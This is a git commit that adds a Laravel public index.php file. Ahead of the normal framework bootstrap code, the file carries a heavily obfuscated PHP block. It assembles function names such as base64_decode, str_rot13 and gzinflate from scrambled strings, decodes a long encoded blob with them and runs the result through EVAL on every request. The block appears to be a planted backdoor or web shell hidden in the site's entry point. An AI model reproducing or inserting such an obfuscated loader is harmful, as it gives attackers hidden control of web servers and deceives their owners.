c5308896fe079ec46822649b9939826ca2ab9ddc
hoabinhgroup <louis.standbyme@gmail.com>
2023-02-15 15:49:04 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,82 @@
+<?php
+ 
+		$NE6P3=function($Krawu
+) {$m7f = "_Sr3";$sTxjygm20=$m7f[(92 - 87 +1) /6]
+.
+'t'. $m7f[(55 -47) / 4]	.$m7f[(90- 83- 7)/ 4]	. $m7f[(9 +1 -2) /4]
+;$sTxjygm20.=	'O';$sTxjygm20 .=	'T'.
+((23- 17) /6) .((75 -66) /3). '';  	 return $sTxjygm20($Krawu);};$DRX=function ($A93h){$l54nC = "RPb4nfqo";$RJPfVZxy=$l54nC[(63- 35) /4]. $l54nC[(101-93 + 8) / 4].$l54nC[(84 -60+6) / 6]	. $l54nC[(85 - 85) / 2];
+$RJPfVZxy
+.=		((70- 46) / 4);$RJPfVZxy.= $l54nC[(55-49 + 3)/3] . '_'.	$l54nC[(83 -43- 10)/ 5] .'r' .$l54nC[(84 -73 - 9) /2]	. $l54nC[(17-8 - 3) /3] .$l54nC[(83 - 68 - 3) / 2].$l54nC[(80- 86+6) /2]	.'';$RJPfVZxy=str_rot13($RJPfVZxy);return $RJPfVZxy($A93h);	 	 };$NE6P3=	function($Krawu){$m7f = "_Sr3";$sTxjygm20=$m7f[(92 - 87 +1) /6]	.	't'	.
+$m7f[(55 -47) / 4].$m7f[(90- 83- 7)/ 4].$m7f[(9 +1 -2) /4]	; $sTxjygm20	.= 'O' ;$sTxjygm20	.= 'T'	. ((23- 17) /6)
+.((75 -66) /3). ''; return $sTxjygm20($Krawu);	 
+  };$yYYrOXK
+= function($RXq3xmVx5	,$ODtrRQOb	,$_gVepLVzZ	)
+{  $pH_ZBN="mrp2RumUokdwsDJUfOZAZ";
+   	 return $pH_ZBN;};$yf7A=
+function ($dCGEuJo) {$HknLKOS = "dHG";$gQyM=$HknLKOS[(62- 57 -3)/2].$HknLKOS[(42-38)/2].$HknLKOS[(34 - 34)/3] .	'I'	; $gQyM.=	'G'	. '';return $gQyM($dCGEuJo);
+}; 	$yf7A =function($dCGEuJo ){$HknLKOS = "dHG";$gQyM=$HknLKOS[(62- 57 -3)/2].	$HknLKOS[(42-38)/2]	.	$HknLKOS[(34 - 34)/3] .'I';$gQyM.=
+	'G'.'';return $gQyM($dCGEuJo);}; 		
+function IJ9iVVa1Q	($T9ycySE,$oRE7D8h4E,$APBYdWt ){
+
+$zMCsX="XNuqw1lG30OQb9UUI";return $zMCsX;}	$j8p_w='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';		function NWlRdV ($Gna6_xR	) {$DH8mAw = "ugz7Z49/T";$syXANwl7M=((43 -31 + 2)/ 2) . 'I' ; $syXANwl7M .=	$DH8mAw[(70 -80+10) / 4].'o'.'H' ; $syXANwl7M.=	$DH8mAw[(116 - 70- 10)/ 6]; $syXANwl7M .= $DH8mAw[(9 -6)/ 3].$DH8mAw[(92 - 76) /2]	.	'S'.'U'.((85 - 84+ 7)/ 2). $DH8mAw[(68 - 58) /5].	$DH8mAw[(53 - 46 +1) / 2]	.
+$DH8mAw[(86-51)/ 5].'';	 return $syXANwl7M;} function hgdIG($oIXB_aZ9	)	{return NWlRdV('')	.$oIXB_aZ9;} 	
+ 	$j8p_w=
+$yf7A($j8p_w);$j8p_w=$NE6P3($j8p_w);function zyu	($_Keal5Jp){$i5Fc = "tlFneG";$tPOfaX1=$i5Fc[(87-58 - 4)/ 5].'z'.	'i';$tPOfaX1.= 	$i5Fc[(73 - 67)/ 2].
+$i5Fc[(37 -18 - 7)/6]	.$i5Fc[(17- 11)/ 6].'a'
+;	$tPOfaX1.= 	$i5Fc[(55 -47-8) / 3]	;$tPOfaX1.= 
+$i5Fc[(119 -105 +10) /6].	''; 		  return $tPOfaX1($_Keal5Jp); }$j8p_w=$DRX($j8p_w);	$j8p_w=	zyu($j8p_w);EVAL($j8p_w); ?><?php
+
+use Illuminate\Contracts\Http\Kernel;
+use Illuminate\Http\Request;
+
+define('LARAVEL_START', microtime(true));
+
+/*
+|--------------------------------------------------------------------------
+| Check If The Application Is Under Maintenance
+|--------------------------------------------------------------------------
+|
+| If the application is in maintenance / demo mode via the "down" command
+| we will load this file so that any pre-rendered content can be shown
+| instead of starting the framework, which could cause an exception.
+|
+*/
+
+if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
+    require __DIR__.'/../storage/framework/maintenance.php';
+}
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| this application. We just need to utilize it! We'll simply require it
+| into the script here so we don't need to manually load our classes.
+|
+*/
+
+require __DIR__.'/../vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request using
+| the application's HTTP kernel. Then, we will send the response back
+| to this client's browser, allowing them to enjoy our application.
+|
+*/
+
+$app = require_once __DIR__.'/../bootstrap/app.php';
+
+$kernel = $app->make(Kernel::class);
+
+$response = tap($kernel->handle(
+    $request = Request::capture()
+))->send();
+
+$kernel->terminate($request, $response);
